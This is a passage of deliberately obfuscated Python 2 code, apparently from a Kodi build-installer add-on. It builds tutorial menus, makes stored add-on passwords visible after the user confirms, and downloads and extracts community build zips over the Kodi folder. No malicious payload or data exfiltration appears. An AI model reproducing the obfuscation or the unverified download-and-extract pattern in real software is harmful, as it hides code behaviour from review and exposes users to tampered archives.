 O0OoO0O = re . compile ( 'step15="(.+?)"' ) . findall ( i11i1ii1I )
 iii1I1II1iIii = re . compile ( 'screenshot1="(.+?)"' ) . findall ( i11i1ii1I )
 iioOo00O0o = re . compile ( 'screenshot2="(.+?)"' ) . findall ( i11i1ii1I )
 iI11IIi1iiI1I = re . compile ( 'screenshot3="(.+?)"' ) . findall ( i11i1ii1I )
 oO0o = re . compile ( 'screenshot4="(.+?)"' ) . findall ( i11i1ii1I )
 O0ooOoO0 = re . compile ( 'screenshot5="(.+?)"' ) . findall ( i11i1ii1I )
 Ii1I11IIi1 = re . compile ( 'screenshot6="(.+?)"' ) . findall ( i11i1ii1I )
 I1ii = re . compile ( 'screenshot7="(.+?)"' ) . findall ( i11i1ii1I )
 iiIiii11I1 = re . compile ( 'screenshot8="(.+?)"' ) . findall ( i11i1ii1I )
 i1II1iIii = re . compile ( 'screenshot9="(.+?)"' ) . findall ( i11i1ii1I )
 i1iII1iii = re . compile ( 'screenshot10="(.+?)"' ) . findall ( i11i1ii1I )
 o0O0oOO0o0o = re . compile ( 'screenshot11="(.+?)"' ) . findall ( i11i1ii1I )
 O0O0O00OoO0O = re . compile ( 'screenshot12="(.+?)"' ) . findall ( i11i1ii1I )
 i1II11III = re . compile ( 'screenshot13="(.+?)"' ) . findall ( i11i1ii1I )
 O0OO0oo = re . compile ( 'screenshot14="(.+?)"' ) . findall ( i11i1ii1I )
 OoOoo00O00oOOO = re . compile ( 'screenshot15="(.+?)"' ) . findall ( i11i1ii1I )
 if 64 - 64: i1IIi / OoooooooOO / I1ii11iIi11i - Oo0Ooo + ooOo
 oOo00O0oo00o0 = I11IIIi [ 0 ] if ( len ( I11IIIi ) > 0 ) else ''
 ii1i1II = ooO [ 0 ] if ( len ( ooO ) > 0 ) else ''
 iI1IIIii = oOOO0OO [ 0 ] if ( len ( oOOO0OO ) > 0 ) else 'None'
 I1i11ii11 = I11ii1iI11 [ 0 ] if ( len ( I11ii1iI11 ) > 0 ) else 'None'
 OO00O0oOO = i11ii111i1ii [ 0 ] if ( len ( i11ii111i1ii ) > 0 ) else 'None'
 Ii1iI111 = Oo0O0O [ 0 ] if ( len ( Oo0O0O ) > 0 ) else 'None'
 O0oooo00o0Oo = IiIiiI1ii111 [ 0 ] if ( len ( IiIiiI1ii111 ) > 0 ) else 'None'
 IiIIi1 = i11ii1 [ 0 ] if ( len ( i11ii1 ) > 0 ) else 'None'
 iII11I1Ii1 = Ii111I11 [ 0 ] if ( len ( Ii111I11 ) > 0 ) else 'None'
 o0o0oOo0oO = Oo0O0oo [ 0 ] if ( len ( Oo0O0oo ) > 0 ) else 'None'
 IIi1IIIIi = o0O0 [ 0 ] if ( len ( o0O0 ) > 0 ) else 'None'
 OOOoO = oO0o0 [ 0 ] if ( len ( oO0o0 ) > 0 ) else 'None'
 II1IiI1iI = IiiI11ii1II1 [ 0 ] if ( len ( IiiI11ii1II1 ) > 0 ) else ''
 iI1i1II11I = '[CR][CR][COLOR=dodgerblue]Step 1:[/COLOR][CR]' + IIi1oo0oOOo0 [ 0 ] if ( len ( IIi1oo0oOOo0 ) > 0 ) else ''
 OoO0o0oOOoOoo = '[CR][CR][COLOR=dodgerblue]Step 2:[/COLOR][CR]' + oOOi1Ii [ 0 ] if ( len ( oOOi1Ii ) > 0 ) else ''
 I1iIiiiI1II1 = '[CR][CR][COLOR=dodgerblue]Step 3:[/COLOR][CR]' + O0Oo0Oo000 [ 0 ] if ( len ( O0Oo0Oo000 ) > 0 ) else ''
 o0OOo00Oo00 = '[CR][CR][COLOR=dodgerblue]Step 4:[/COLOR][CR]' + ooo0Oo00000oooO [ 0 ] if ( len ( ooo0Oo00000oooO ) > 0 ) else ''
 iII1I = '[CR][CR][COLOR=dodgerblue]Step 5:[/COLOR][CR]' + iIiiiiIi111I [ 0 ] if ( len ( iIiiiiIi111I ) > 0 ) else ''
 oOoOo0O00Oo = '[CR][CR][COLOR=dodgerblue]Step 6:[/COLOR][CR]' + ooOo00oOOOO0 [ 0 ] if ( len ( ooOo00oOOOO0 ) > 0 ) else ''
 Iiii1iiIi = '[CR][CR][COLOR=dodgerblue]Step 7:[/COLOR][CR]' + iii1IiIiII1 [ 0 ] if ( len ( iii1IiIiII1 ) > 0 ) else ''
 oOoOOi1iIiII111i11 = '[CR][CR][COLOR=dodgerblue]Step 8:[/COLOR][CR]' + O00oo00O0OO0ooO [ 0 ] if ( len ( O00oo00O0OO0ooO ) > 0 ) else ''
 i1iIiiii = '[CR][CR][COLOR=dodgerblue]Step 9:[/COLOR][CR]' + iIi1I [ 0 ] if ( len ( iIi1I ) > 0 ) else ''
 O0o0oOo0OooO = '[CR][CR][COLOR=dodgerblue]Step 10:[/COLOR][CR]' + OO0O0ooOo [ 0 ] if ( len ( OO0O0ooOo ) > 0 ) else ''
 iI1IiI1 = '[CR][CR][COLOR=dodgerblue]Step 11:[/COLOR][CR]' + iI11 [ 0 ] if ( len ( iI11 ) > 0 ) else ''
 o0o0ooo = '[CR][CR][COLOR=dodgerblue]Step 12:[/COLOR][CR]' + iI1ii111II [ 0 ] if ( len ( iI1ii111II ) > 0 ) else ''
 oOooO = '[CR][CR][COLOR=dodgerblue]Step 13:[/COLOR][CR]' + oo0Oo0oo [ 0 ] if ( len ( oo0Oo0oo ) > 0 ) else ''
 o0OOooo0ooo0o = '[CR][CR][COLOR=dodgerblue]Step 14:[/COLOR][CR]' + o0Ooo0oOoo [ 0 ] if ( len ( o0Ooo0oOoo ) > 0 ) else ''
 i11IIi = '[CR][CR][COLOR=dodgerblue]Step 15:[/COLOR][CR]' + O0OoO0O [ 0 ] if ( len ( O0OoO0O ) > 0 ) else ''
 I1IIi = iii1I1II1iIii [ 0 ] if ( len ( iii1I1II1iIii ) > 0 ) else ''
 i1i1IOOOOO0o0O0OOO = iioOo00O0o [ 0 ] if ( len ( iioOo00O0o ) > 0 ) else ''
 O0oo0o00O = iI11IIi1iiI1I [ 0 ] if ( len ( iI11IIi1iiI1I ) > 0 ) else ''
 Iii1 = oO0o [ 0 ] if ( len ( oO0o ) > 0 ) else ''
 I11i1IiiI = O0ooOoO0 [ 0 ] if ( len ( O0ooOoO0 ) > 0 ) else ''
 OOooOO000oOoOo000 = Ii1I11IIi1 [ 0 ] if ( len ( Ii1I11IIi1 ) > 0 ) else ''
 o0O0o0ooo0 = I1ii [ 0 ] if ( len ( I1ii ) > 0 ) else ''
 iIo0O000O00o = iiIiii11I1 [ 0 ] if ( len ( iiIiii11I1 ) > 0 ) else ''
 iiooo = i1II1iIii [ 0 ] if ( len ( i1II1iIii ) > 0 ) else ''
 ii111I1I1I = i1iII1iii [ 0 ] if ( len ( i1iII1iii ) > 0 ) else ''
 iIIiIi1IiI1 = o0O0oOO0o0o [ 0 ] if ( len ( o0O0oOO0o0o ) > 0 ) else ''
 Oo0O = O0O0O00OoO0O [ 0 ] if ( len ( O0O0O00OoO0O ) > 0 ) else ''
 Iii1I1III11 = i1II11III [ 0 ] if ( len ( i1II11III ) > 0 ) else ''
 i1ii1IiIiIii = O0OO0oo [ 0 ] if ( len ( O0OO0oo ) > 0 ) else ''
 O00iiIi1iI1iI1i = OoOoo00O00oOOO [ 0 ] if ( len ( OoOoo00O00oOOO ) > 0 ) else ''
 IiIi11Iii = str ( '[COLOR=orange]Author: [/COLOR]' + ii1i1II + '[CR][CR][COLOR=lime]About: [/COLOR]' + II1IiI1iI + iI1i1II11I + OoO0o0oOOoOoo + I1iIiiiI1II1 + o0OOo00Oo00 + iII1I + oOoOo0O00Oo + Iiii1iiIi + oOoOOi1iIiII111i11 + i1iIiiii + O0o0oOo0OooO + iI1IiI1 + o0o0ooo + oOooO + o0OOooo0ooo0o + i11IIi )
 if 34 - 34: oOO00 + i1Ii11i1i + Oo0Ooo / II111iiii
 if iI1i1II11I != '' :
  IiII111i1i11 ( '' , '[COLOR=darkcyan][Text Guide][/COLOR]  ' + oOo00O0oo00o0 , IiIi11Iii , 'text_guide' , 'How_To.png' , oOoOooOo0o0 , II1IiI1iI , '' )
 if iI1IIIii != 'None' :
  IiII111i1i11 ( '' , '[COLOR=lime][VIDEO][/COLOR]  ' + IiIIi1 , iI1IIIii , 'play_video' , 'Video_Guide.png' , oOoOooOo0o0 , '' , '' )
 if I1i11ii11 != 'None' :
  IiII111i1i11 ( '' , '[COLOR=lime][VIDEO][/COLOR]  ' + iII11I1Ii1 , I1i11ii11 , 'play_video' , 'Video_Guide.png' , oOoOooOo0o0 , '' , '' )
 if OO00O0oOO != 'None' :
  IiII111i1i11 ( '' , '[COLOR=lime][VIDEO][/COLOR]  ' + o0o0oOo0oO , OO00O0oOO , 'play_video' , 'Video_Guide.png' , oOoOooOo0o0 , '' , '' )
 if Ii1iI111 != 'None' :
  IiII111i1i11 ( '' , '[COLOR=lime][VIDEO][/COLOR]  ' + IIi1IIIIi , Ii1iI111 , 'play_video' , 'Video_Guide.png' , oOoOooOo0o0 , '' , '' )
 if O0oooo00o0Oo != 'None' :
  IiII111i1i11 ( '' , '[COLOR=lime][VIDEO][/COLOR]  ' + OOOoO , O0oooo00o0Oo , 'play_video' , 'Video_Guide.png' , oOoOooOo0o0 , '' , '' )
  if 33 - 33: OO000 . i1IIi - II111iiii - OoO0O00
  if 31 - 31: OooO00OOoO00 - OoOoOO00 / o0oOOo0O0Ooo * OoOoOO00 / Oo0Ooo + o0oOOo0O0Ooo
def I1iII1IiI11i ( ) :
 if o0O . getSetting ( 'tutorial_manual_search' ) == 'true' :
  IiII111i1i11 ( 'folder' , '[COLOR=darkcyan]Manual Search[/COLOR]' , 'tutorials' , 'manual_search' , 'Manual_Search.png' , '' , '' , '' )
 if o0O . getSetting ( 'tutorial_all' ) == 'true' :
  IiII111i1i11 ( 'folder' , '[COLOR=lime]All Guides[/COLOR] Everything in one place' , '' , 'grab_tutorials' , 'All.png' , '' , '' , '' )
 if o0O . getSetting ( 'tutorial_kodi' ) == 'true' :
  IiII111i1i11 ( 'folder' , '[COLOR=lime]XBMC / Kodi[/COLOR] Specific' , '' , 'xbmc_menu' , 'XBMC.png' , '' , '' , '' )
 if o0O . getSetting ( 'tutorial_xbmc4xbox' ) == 'true' :
  IiII111i1i11 ( 'folder' , '[COLOR=lime]XBMC4Xbox[/COLOR] Specific' , '&platform=XBMC4Xbox' , 'xbmc_menu' , 'XBMC4Xbox.png' , '' , '' , '' )
 if o0O . getSetting ( 'tutorial_android' ) == 'true' :
  IiII111i1i11 ( 'folder' , '[COLOR=orange][Platform][/COLOR] Android' , '&platform=Android' , 'platform_menu' , 'Android.png' , '' , '' , '' )
 if o0O . getSetting ( 'tutorial_atv' ) == 'true' :
  IiII111i1i11 ( 'folder' , '[COLOR=orange][Platform][/COLOR] Apple TV' , '&platform=ATV' , 'platform_menu' , 'ATV.png' , '' , '' , '' )
 if o0O . getSetting ( 'tutorial_ios' ) == 'true' :
  IiII111i1i11 ( 'folder' , '[COLOR=orange][Platform][/COLOR] ATV2 & iOS' , '&platform=iOS' , 'platform_menu' , 'iOS.png' , '' , '' , '' )
 if o0O . getSetting ( 'tutorial_linux' ) == 'true' :
  IiII111i1i11 ( 'folder' , '[COLOR=orange][Platform][/COLOR] Linux' , '&platform=Linux' , 'platform_menu' , 'Linux.png' , '' , '' , '' )
 if o0O . getSetting ( 'tutorial_pure_linux' ) == 'true' :
  IiII111i1i11 ( 'folder' , '[COLOR=orange][Platform][/COLOR] Pure Linux' , '&platform=Custom_Linux' , 'platform_menu' , 'Custom_Linux.png' , '' , '' , '' )
 if o0O . getSetting ( 'tutorial_openelec' ) == 'true' :
  IiII111i1i11 ( 'folder' , '[COLOR=orange][Platform][/COLOR] OpenELEC' , '&platform=OpenELEC' , 'platform_menu' , 'OpenELEC.png' , '' , '' , '' )
 if o0O . getSetting ( 'tutorial_osmc' ) == 'true' :
  IiII111i1i11 ( 'folder' , '[COLOR=orange][Platform][/COLOR] OSMC' , '&platform=OSMC' , 'platform_menu' , 'OSMC.png' , '' , '' , '' )
 if o0O . getSetting ( 'tutorial_osx' ) == 'true' :
  IiII111i1i11 ( 'folder' , '[COLOR=orange][Platform][/COLOR] OSX' , '&platform=OSX' , 'platform_menu' , 'OSX.png' , '' , '' , '' )
 if o0O . getSetting ( 'tutorial_raspbmc' ) == 'true' :
  IiII111i1i11 ( 'folder' , '[COLOR=orange][Platform][/COLOR] Raspbmc' , '&platform=Raspbmc' , 'platform_menu' , 'Raspbmc.png' , '' , '' , '' )
 if o0O . getSetting ( 'tutorial_windows' ) == 'true' :
  IiII111i1i11 ( 'folder' , '[COLOR=orange][Platform][/COLOR] Windows' , '&platform=Windows' , 'platform_menu' , 'Windows.png' , '' , '' , '' )
 if o0O . getSetting ( 'tutorial_allwinner' ) == 'true' :
  IiII111i1i11 ( 'folder' , '[COLOR=dodgerblue][Hardware][/COLOR] Allwinner Devices' , '&hardware=Allwinner' , 'platform_menu' , 'Allwinner.png' , '' , '' , '' )
 if o0O . getSetting ( 'tutorial_aftv' ) == 'true' :
  IiII111i1i11 ( 'folder' , '[COLOR=dodgerblue][Hardware][/COLOR] Amazon Fire TV' , '&hardware=AFTV' , 'platform_menu' , 'AFTV.png' , '' , '' , '' )
 if o0O . getSetting ( 'tutorial_amlogic' ) == 'true' :
  IiII111i1i11 ( 'folder' , '[COLOR=dodgerblue][Hardware][/COLOR] AMLogic Devices' , '&hardware=AMLogic' , 'platform_menu' , 'AMLogic.png' , '' , '' , '' )
 if o0O . getSetting ( 'tutorial_boxee' ) == 'true' :
  IiII111i1i11 ( 'folder' , '[COLOR=dodgerblue][Hardware][/COLOR] Boxee' , '&hardware=Boxee' , 'platform_menu' , 'Boxee.png' , '' , '' , '' )
 if o0O . getSetting ( 'tutorial_intel' ) == 'true' :
  IiII111i1i11 ( 'folder' , '[COLOR=dodgerblue][Hardware][/COLOR] Intel Devices' , '&hardware=Intel' , 'platform_menu' , 'Intel.png' , '' , '' , '' )
 if o0O . getSetting ( 'tutorial_rpi' ) == 'true' :
  IiII111i1i11 ( 'folder' , '[COLOR=dodgerblue][Hardware][/COLOR] Raspberry Pi' , '&hardware=RaspberryPi' , 'platform_menu' , 'RaspberryPi.png' , '' , '' , '' )
 if o0O . getSetting ( 'tutorial_rockchip' ) == 'true' :
  IiII111i1i11 ( 'folder' , '[COLOR=dodgerblue][Hardware][/COLOR] Rockchip Devices' , '&hardware=Rockchip' , 'platform_menu' , 'Rockchip.png' , '' , '' , '' )
 if o0O . getSetting ( 'tutorial_xbox' ) == 'true' :
  IiII111i1i11 ( 'folder' , '[COLOR=dodgerblue][Hardware][/COLOR] Xbox' , '&hardware=Xbox' , 'platform_menu' , 'Xbox_Original.png' , '' , '' , '' )
  if 66 - 66: Oo0Ooo . ooOo - O0 . i1Ii11i1i + OOOOOOoo0O / i11iIiiIii
  if 52 - 52: ooOo % Oo0Ooo * II111iiii
def ii1iiiIIiIII ( ) :
 OO0o = xbmcgui . Dialog ( )
 if OO0o . yesno ( "Make Add-on Passwords Visible?" , "This will make all your add-on passwords visible in the add-on settings. Are you sure you wish to continue?" ) :
  for Oo0 , o0IiiiI111I , III1I11i1iIi in os . walk ( ooooooO0oo ) :
   for oooO in III1I11i1iIi :
    if oooO == 'settings.xml' :
     i1I = open ( os . path . join ( Oo0 , oooO ) ) . read ( )
     i1iIiIi1I = re . compile ( '<setting id=(.+?)>' ) . findall ( i1I )
     for i1IIIi111111 in i1iIiIi1I :
      if 'pass' in i1IIIi111111 :
       if 'option="hidden"' in i1IIIi111111 :
        try :
         O0Ii1iIii1I1 = i1IIIi111111 . replace ( ' option="hidden"' , '' )
         oooO = open ( os . path . join ( Oo0 , oooO ) , mode = 'w' )
         oooO . write ( str ( i1I ) . replace ( i1IIIi111111 , O0Ii1iIii1I1 ) )
         oooO . close ( )
        except :
         pass
  OO0o . ok ( "Passwords Are now visible" , "Your passwords will now be visible in your add-on settings. If you want to undo this please use the option to hide passwords." )
  if 3 - 3: oOO00 % i1Ii11i1i . OoooooooOO
  if 19 - 19: i1Ii11i1i * OO000 - ooOo
def oOo000oOo ( name , url , video , description , skins , guisettingslink , artpack ) :
 Ooo . create ( "Backing Up Important Data" , 'Please wait...' , '' , '' )
 if 42 - 42: Oo % Oo
 if 87 - 87: Oo0Ooo + I1IiiI % I1IiiI * i11iIiiIii
 o00I11II1iI = open ( O0Oo000ooO00 , mode = 'r' )
 i1Ooo0O0OO0OOo = o00I11II1iI . read ( )
 o00I11II1iI . close ( )
 if 12 - 12: OooO00OOoO00
 Ooo00O0ooOo = re . compile ( 'gui="(.+?)"' ) . findall ( i1Ooo0O0OO0OOo )
 I1I1i11i1 = Ooo00O0ooOo [ 0 ] if ( len ( Ooo00O0ooOo ) > 0 ) else '0'
 if 61 - 61: II111iiii
 if 78 - 78: i11iIiiIii + OoooooooOO + OOOOOOoo0O - OoO0O00
 if iiIIIII1i1iI == 'true' :
  try :
   ii1i11i11 = open ( OOOOi11i1 , mode = 'r' )
   O0o0oO0oO0 = ii1i11i11 . read ( )
   ii1i11i11 . close ( )
   if 28 - 28: oOO00 . o0oOOo0O0Ooo
  except :
   print "### No favourites file to copy"
   if 87 - 87: iIii1I11I1II1 * II111iiii - i1Ii11i1i % i1Ii11i1i - Oo
 if o0oO0 == 'true' :
  try :
   i1iiIiIi1iIII = open ( IIIii1II1II , mode = 'r' )
   OoiII111i1IiiII = i1iiIiIi1iIII . read ( )
   i1iiIiIi1iIII . close ( )
   if 34 - 34: OoOoOO00 - O0 / OoO0O00 - I1ii11iIi11i
  except :
   print "### No sources file to copy"
   if 12 - 12: oOO00 * OoOoOO00 / i11iIiiIii + i11iIiiIii
 Iii1I1 = 1
 IioOo0O ( )
 if 14 - 14: ooOo
 if 46 - 46: o0oOOoo % Oo + II111iiii * i1IIi
 if os . path . exists ( O00OOOoOoo0O ) :
  if 81 - 81: ooOo - o0oOOo0O0Ooo + OOOOOOoo0O
  if os . path . exists ( O000OO0 ) :
   os . remove ( O00OOOoOoo0O )
   if 49 - 49: OoooooooOO
  else :
   os . rename ( O00OOOoOoo0O , O000OO0 )
   if 74 - 74: Oo - II111iiii
 if os . path . exists ( I11iii1Ii ) :
  os . remove ( I11iii1Ii )
  if 66 - 66: i11iIiiIii + i1Ii11i1i . o0oOOoo
  if 46 - 46: i1Ii11i1i / I1ii11iIi11i
 if not os . path . exists ( OOOO0OOoO0O0 ) :
  iiIi1I1i1 = open ( OOOO0OOoO0O0 , mode = 'w+' )
  iiIi1I1i1 . close ( )
  if 41 - 41: i1IIi % OO000 + i1Ii11i1i . Oo0Ooo / iIii1I11I1II1
 Ooo . close ( )
 Ooo . create ( "Downloading Skin Fix" , "Downloading guisettings.xml" , '' , 'Please Wait' )
 iiIII1i = os . path . join ( oO0Oo , 'guifix.zip' )
 if 77 - 77: Oo0Ooo . OoO0O00 % O0 - OoO0O00 - Oo0Ooo
 if 95 - 95: oOO00 * II111iiii % o0oOOo0O0Ooo * Oo0Ooo . OooO00OOoO00
 try :
  print "### attempting to download guisettings.xml"
  downloader . download ( guisettingslink , iiIII1i , Ooo )
  Ooo . close ( )
 except :
  OO0o . ok ( 'Problem Detected' , 'Sorry there was a problem downloading the guisettings file. Please check your storage location, if you\'re certain that\'s ok please notify the build author on the relevant support thread.' )
  print "### FAILED to download " + guisettingslink
  if 46 - 46: II111iiii - OoO0O00 % o0oOOoo
 if zipfile . is_zipfile ( iiIII1i ) :
  o00oO00O0 = str ( os . path . getsize ( iiIII1i ) )
  if 97 - 97: OoO0O00 . OoOoOO00
 else :
  o00oO00O0 = I1I1i11i1
  if 78 - 78: I1ii11iIi11i + I1ii11iIi11i . OoOoOO00 - oOO00 * iIii1I11I1II1 * O0
  if 26 - 26: OoooooooOO + ooOo + OoO0O00 . O0
 iiIi1I1i1 = open ( OOOO0OOoO0O0 , mode = 'r' )
 IiiI = iiIi1I1i1 . read ( )
 iiIi1I1i1 . close ( )
 if 46 - 46: OoooooooOO - Oo0Ooo * i1Ii11i1i * Oo * i1Ii11i1i . ooOo
 IIIII11II1 = re . compile ( 'id="(.+?)"' ) . findall ( IiiI )
 OOOO0oOO = re . compile ( 'name="(.+?)"' ) . findall ( IiiI )
 IIIiii = re . compile ( 'version="(.+?)"' ) . findall ( IiiI )
 if 96 - 96: OO000 / oOO00 % o0oOOo0O0Ooo + OooO00OOoO00
 I11OoooO = IIIII11II1 [ 0 ] if ( len ( IIIII11II1 ) > 0 ) else ''
 i1IIi11 = OOOO0oOO [ 0 ] if ( len ( OOOO0oOO ) > 0 ) else ''
 o0oO0o0oo0O0 = IIIiii [ 0 ] if ( len ( IIIiii ) > 0 ) else ''
 if 46 - 46: OoO0O00 * I1IiiI
 if os . path . exists ( O000OOo00oo ) :
  os . removedirs ( O000OOo00oo )
  if 25 - 25: i1Ii11i1i . oOO00 % O0 % i1IIi
  if 53 - 53: O0 % o0oOOoo
 if I1I1i11i1 != o00oO00O0 :
  try :
   os . rename ( O000OO0 , O00OOOoOoo0O )
   if 41 - 41: oOO00
  except :
   OO0o . ok ( "NO GUISETTINGS!" , 'No guisettings.xml file has been found.' , 'Please exit Kodi and try again' , '' )
   return
   if 29 - 29: o0oOOoo
   if 70 - 70: ooOo . O0 % OooO00OOoO00 % oOO00 - OooO00OOoO00 * I1ii11iIi11i
 if video != 'fresh' :
  iIiI1 = xbmcgui . Dialog ( ) . yesno ( name , 'We highly recommend backing up your existing build before installing any community builds. Would you like to perform a backup first?' , nolabel = 'Backup' , yeslabel = 'Install' )
  if 22 - 22: i1IIi
  if iIiI1 == 0 :
   i1i11iii11 = xbmc . translatePath ( os . path . join ( oO0Oo , 'Community_Builds' , 'My_Builds' ) )
   if 82 - 82: ooOo . iIii1I11I1II1 - I1ii11iIi11i
   if not os . path . exists ( i1i11iii11 ) :
    os . makedirs ( i1i11iii11 )
    if 55 - 55: Oo0Ooo % OO000 . iIii1I11I1II1 * i1Ii11i1i
   OO000OOo = oOo0O000Ooo0 ( heading = "Enter a name for this backup" )
   if 33 - 33: O0 - I1IiiI / I1ii11iIi11i / OoO0O00 + OOOOOOoo0O - ooOo
   if ( not OO000OOo ) :
    return False , 0
    if 27 - 27: i1Ii11i1i + o0oOOoo - i1Ii11i1i % i11iIiiIii * Oo0Ooo * o0oOOo0O0Ooo
   O0Oo0O00o0oo0OO = urllib . quote_plus ( OO000OOo )
   OooO00 = xbmc . translatePath ( os . path . join ( i1i11iii11 , O0Oo0O00o0oo0OO + '.zip' ) )
   o0O00OoOOo = [ 'plugin.program.totalinstaller' , 'plugin.program.tbs' ]
   iIiIIi11iI = [ "xbmc.log" , "xbmc.old.log" , "kodi.log" , "kodi.old.log" , '.DS_Store' , '.setup_complete' , 'XBMCHelper.conf' , 'Thumbs.db' , '.gitignore' ]
   I1i11II11i1iI = "Creating full backup of existing build"
   iI1 = "Archiving..."
   I1I1i1i = ""
   OOo0O = "Please Wait"
   IIiIiII ( O0o0Oo , OooO00 , I1i11II11i1iI , iI1 , I1I1i1i , OOo0O , o0O00OoOOo , iIiIIi11iI )
   if 88 - 88: Oo
 oo00IIIIIIIiI = open ( O0Oo000ooO00 , mode = 'w+' )
 if 25 - 25: OoO0O00 + o0oOOo0O0Ooo . o0oOOoo - OO000 . ooOo * OO000
 if I1I1i11i1 != o00oO00O0 :
  oo00IIIIIIIiI . write ( 'id="' + str ( I11OoooO ) + '"\nname="' + i1IIi11 + ' [COLOR=yellow](Partially installed)[/COLOR]"\nversion="' + o0oO0o0oo0O0 + '"\ngui="' + o00oO00O0 + '"' )
  if 85 - 85: i1IIi
 else :
  oo00IIIIIIIiI . write ( 'id="' + str ( I11OoooO ) + '"\nname="' + i1IIi11 + '"\nversion="' + o0oO0o0oo0O0 + '"\ngui="' + o00oO00O0 + '"' )
 oo00IIIIIIIiI . close ( )
 if 94 - 94: OoooooooOO . O0 / OoooooooOO
 if 67 - 67: i11iIiiIii + OoOoOO00
 if video == 'libprofile' or video == 'library' or video == 'updatelibprofile' or video == 'updatelibrary' :
  try :
   shutil . copytree ( iIi1ii1I1 , ooOOO00Ooo , symlinks = False , ignore = shutil . ignore_patterns ( "Textures13.db" , "Addons16.db" , "Addons15.db" , "saltscache.db-wal" , "saltscache.db-shm" , "saltscache.db" , "onechannelcache.db" ) )
   if 50 - 50: o0oOOoo . i1IIi + I1ii11iIi11i . Oo
  except :
   Iii1I1 = xbmcgui . Dialog ( ) . yesno ( name , 'There was an error trying to backup some databases. Continuing may wipe your existing library. Do you wish to continue?' , nolabel = 'No, cancel' , yeslabel = 'Yes, overwrite' )
   if 97 - 97: I1IiiI
   if Iii1I1 == 0 :
    return
    if 63 - 63: O0 - OoOoOO00 / i11iIiiIii / OoooooooOO / o0oOOoo / II111iiii
  OooO00 = xbmc . translatePath ( os . path . join ( oO0Oo , 'Database.zip' ) )
  II11i1IiIII ( ooOOO00Ooo , OooO00 )
  if 45 - 45: II111iiii . OoO0O00 + OoO0O00 * iIii1I11I1II1
 if Iii1I1 == 0 :
  return
  if 23 - 23: oOO00 * OoOoOO00 % OO000 / OO000 - o0oOOoo - Oo
 time . sleep ( 1 )
 if 86 - 86: Oo . OoooooooOO * I1IiiI - Oo0Ooo / i11iIiiIii * OOOOOOoo0O
 if 56 - 56: I1IiiI . OooO00OOoO00 % OOOOOOoo0O
 I1I1iOO = xbmc . translatePath ( os . path . join ( O0o0Oo , '..' , 'koditemp.zip' ) )
 time . sleep ( 2 )
 Ooo . create ( "Community Builds" , "Downloading " + description + " build." , '' , 'Please Wait' )
 i1ii1iIIi11i111I = description . replace ( ' ' , '_' ) . replace ( ':' , '-' ) . replace ( "'" , '' )
 iiIII1i = os . path . join ( oOOoo0Oo , i1ii1iIIi11i111I + '.zip' )
 if 48 - 48: i11iIiiIii
 if not os . path . exists ( oOOoo0Oo ) :
  os . makedirs ( oOOoo0Oo )
  if 25 - 25: I1IiiI . iIii1I11I1II1 * i11iIiiIii / ooOo % OO000
 downloader . download ( url , iiIII1i , Ooo )
 if 55 - 55: i11iIiiIii % i1IIi
 if 39 - 39: OooO00OOoO00 % o0oOOo0O0Ooo . o0oOOo0O0Ooo * i1Ii11i1i + ooOo
 try :
  oOooOO0 = open ( oo0OooOOo0 , mode = 'r' )
  Iiii1iii1i = oOooOO0 . read ( )
  oOooOO0 . close ( )
 except :
  print "### No profiles detected, most likely a fresh wipe performed"
  if 86 - 86: O0 - OoO0O00 % OooO00OOoO00 . ooOo
 Ooo . close ( )
 Ooo . create ( "Community Builds" , "Checking " , '' , 'Please Wait' )
 if 49 - 49: i11iIiiIii - iIii1I11I1II1 % O0 % OOOOOOoo0O * o0oOOoo - oOO00
 if 8 - 8: iIii1I11I1II1 * Oo0Ooo
 if zipfile . is_zipfile ( iiIII1i ) :
  Ooo . update ( 0 , "" , "Extracting Zip Please Wait" )
  extract . all ( iiIII1i , O0o0Oo , Ooo )
  if 11 - 11: I1IiiI / OoooooooOO . Oo0Ooo
 else :
  OO0o . ok ( 'Not a valid zip file' , 'This file is not a valid zip file, please let the build author know on their support thread so they can amend the download path. It\'s most likely just a simple typo on their behalf.' )
  return
  if 19 - 19: I1ii11iIi11i
 Ooo . create ( "Restoring Dependencies" , "Checking " , '' , 'Please Wait' )
 Ooo . update ( 0 , "" , "Extracting Zip Please Wait" )
 if 41 - 41: Oo + o0oOOoo
 if iiIIIII1i1iI == 'true' :
  try :
   print "### Attempting to add back favourites ###"
   oo00IIIIIIIiI = open ( OOOOi11i1 , mode = 'w+' )
   oo00IIIIIIIiI . write ( O0o0oO0oO0 )
   oo00IIIIIIIiI . close ( )
   Ooo . update ( 0 , "" , "Copying Favourites" )
  except :
   print "### Failed to copy back favourites"
   if 15 - 15: OoOoOO00 - i11iIiiIii
 if o0oO0 == 'true' :
  try :
   print "### Attempting to add back sources ###"
   oo00IIIIIIIiI = open ( IIIii1II1II , mode = 'w+' )
   oo00IIIIIIIiI . write ( OoiII111i1IiiII )
   oo00IIIIIIIiI . close ( )
   Ooo . update ( 0 , "" , "Copying Sources" )
   if 48 - 48: II111iiii % OooO00OOoO00
  except :
   print "### Failed to copy back sources"
   if 96 - 96: o0oOOo0O0Ooo
 time . sleep ( 1 )
 if os . path . exists ( ooOOO00Ooo ) :
  shutil . rmtree ( ooOOO00Ooo )
  if 90 - 90: oOO00 * OO000 . OooO00OOoO00 / I1ii11iIi11i % OooO00OOoO00
  if 58 - 58: OOOOOOoo0O % iIii1I11I1II1 * OoO0O00
 if os . path . exists ( o00OO00OoO ) :
  iiIi1I1i1 = open ( o00OO00OoO , mode = 'r' )
  IiiI = iiIi1I1i1 . read ( )
  iiIi1I1i1 . close ( )
  iIiiI111I11 = re . compile ( 'version="[\s\S]*?"' ) . findall ( IiiI )
  iiIiII1 = iIiiI111I11 [ 0 ] if ( len ( iIiiI111I11 ) > 0 ) else ''
  iiiI1i11Ii = IiiI . replace ( iiIiII1 , 'version="' + o0oO0o0oo0O0 + '"' )
  oo00IIIIIIIiI = open ( o00OO00OoO , mode = 'w' )
  oo00IIIIIIIiI . write ( str ( iiiI1i11Ii ) )
  oo00IIIIIIIiI . close ( )
  if 25 - 25: i1Ii11i1i - o0oOOoo + Oo0Ooo . I1IiiI % iIii1I11I1II1
 else :
  oo00IIIIIIIiI = open ( o00OO00OoO , mode = 'w+' )
  oo00IIIIIIIiI . write ( 'date="01011001"\nversion="' + o0oO0o0oo0O0 + '"' )
  oo00IIIIIIIiI . close ( )
  if 49 - 49: i1IIi + OoO0O00 + OOOOOOoo0O / Oo0Ooo
  if 5 - 5: i11iIiiIii + OooO00OOoO00 . oOO00
 if IiiIII111iI == 'false' :
  os . remove ( iiIII1i )
